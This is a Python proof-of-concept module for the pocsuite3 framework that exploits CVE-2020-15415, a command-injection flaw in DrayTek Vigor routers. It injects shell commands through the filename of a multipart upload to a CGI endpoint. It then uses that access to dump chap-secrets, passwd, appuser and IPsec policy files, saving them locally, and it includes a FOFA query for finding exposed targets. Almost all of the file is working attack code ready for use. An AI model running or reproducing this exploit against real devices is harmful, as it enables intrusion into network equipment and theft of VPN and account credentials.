import sys
import string
import json
from urllib.parse import quote
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str
requests.packages.urllib3.disable_warnings()


class VigorPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['z3r0yu']
    vulDate = '2020-09-15'
    createDate = '2020-09-15'
    updateDate = '2020-09-15'
    references = ['']
    name = 'Vigor Remote Command Execution'
    appPowerLink = ''
    appName = 'Vigor'
    appVersion = '''
    Vigor2960
    Vigor300b
    Vigor3900
    '''
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
    https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-15415&scoretype=cvssv2

    fofa.so
    app="DrayTek-Vigor2960" || app="DrayTek-Vigor300B" || app="DrayTek-Vigor3900"
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def atk(self, url, cmd):
        magic = "EOFKAN9"
        s = requests.session()
        raw_data = """------WebKitFormBoundary                                         
Content-Disposition: form-data; name="abc"; filename="t';echo 1;{};echo '{}_"
Content-Type: text/x-python-script



------WebKitFormBoundary--""".format(cmd, magic)
        url = "{}/cgi-bin/mainfunction.cgi/cvmcfgupload?1=2".format(url)
        try:
            r = s.post(url, data=raw_data, headers={
                       'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'}, verify=False)
            res = r.content.decode()
            # print(res)
            if magic in res:
                res = res[1:res.find(magic)].strip()
                return 'OK', res
            else:
                return 'ERROR', res
        except Exception as e:
            msg = repr(e)
            mmsg = msg.lower()
            if 'timed out' in mmsg:
                return 'TIMEOUT', msg
            elif 'refused' in mmsg:
                return 'REFUSED', msg
            else:
                return 'EXCEPTION', msg

    def safe_atk(self,  url, verbose=False, fix_pins=[]):
        UNTESTED = ("UNTESTED", "untested because of first pin error.")
        if verbose:
            logger.info('[*] Working on {}'.format(url))

        pins = {
            "chapsecrets": "cd ..;cd ..;cd etc;cd ppp;cat chap-secrets",
            "appuser": "cd ..;cd ..;cd etc;cd persistence;cd config;cat appuser",
            "passwd": "cd ..;cd ..;cd etc;cat passwd",
            "policy": "cd ..;cd ..;cd etc;cd persistence;cd config;cat ipsec*policy",
        }

        pinkeys = pins.keys()
        ret = {}
        for k in pinkeys:
            if (fix_pins and k in fix_pins) or not fix_pins:
                ret[k] = UNTESTED

        first = True
        for k in pinkeys:
            if (fix_pins and k in fix_pins) or not fix_pins:
                pin = pins[k]
                if verbose:
                    logger.info('[*] Fetching {}...'.format(k))
                code, res = self.atk(url, pin)
                if verbose:
                    # print(code)
                    pass
                ret[k] = (code, res)
                if not code == 'OK':
                    if first:
                        return ret
                first = False
        return ret

    def _verify(self):
        result = {}
        # print(self.url)
        base_url = self.url
        # print(url)

        try:
            res = self.safe_atk(base_url, True)
            # print(res)
            if res['chapsecrets'][0] == "OK":
                f = open("/tmp/res.json", 'a+')
                json.dump(res, f, indent=4, ensure_ascii=False)
                f.close()
                logger.info("Result saved in res.json")
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = base_url
                result['VerifyInfo']['SavePath'] = "/tmp/res.json"
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(VigorPOC)
